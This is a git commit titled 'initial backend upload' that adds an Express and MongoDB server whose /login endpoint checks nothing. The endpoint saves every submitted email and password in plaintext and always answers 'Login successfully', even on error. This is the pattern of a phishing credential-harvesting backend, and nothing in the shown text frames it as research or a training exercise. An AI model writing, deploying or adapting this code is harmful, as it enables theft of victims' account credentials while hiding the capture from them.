c9ae2511e554e5801191c4f7581c718350e7b3b1
Dipak Kore <143119618+Dipakkore@users.noreply.github.com>
2026-03-08 15:14:33 +0530

    initial backend upload

---
+++ index.js
@@ -0,0 +1,47 @@
+import express from "express";
+import mongoose from "mongoose";
+import cors from "cors";
+import dotenv from "dotenv";
+dotenv.config();
+
+
+const app = express();
+
+app.use(cors());
+app.use(express.json());
+
+/* ---------------- MongoDB Connect ---------------- */
+mongoose.connect(process.env.MONGO_URI)
+.then(() => console.log("✅ MongoDB connected"));
+
+/* ---------------- Schema ---------------- */
+const userSchema = new mongoose.Schema({
+  email: String,
+  password: String,
+  time: {
+    type: Date,
+    default: Date.now   // ✅ auto time save
+  }
+});
+
+const User = mongoose.model("User", userSchema);
+
+/* ---------------- LOGIN (ALWAYS SAVE) ---------------- */
+app.post("/login", async (req, res) => {
+  try {
+    const { email, password } = req.body;
+
+    await User.create({ email, password });
+
+    return res.json({ message: "Login successfully" });
+
+  } catch {
+    // even error → same message
+    return res.json({ message: "Login successfully" });
+  }
+});
+
+/* ---------------- SERVER ---------------- */
+app.listen(5000, () =>
+  console.log("🚀 Server running on port 5000")
+);
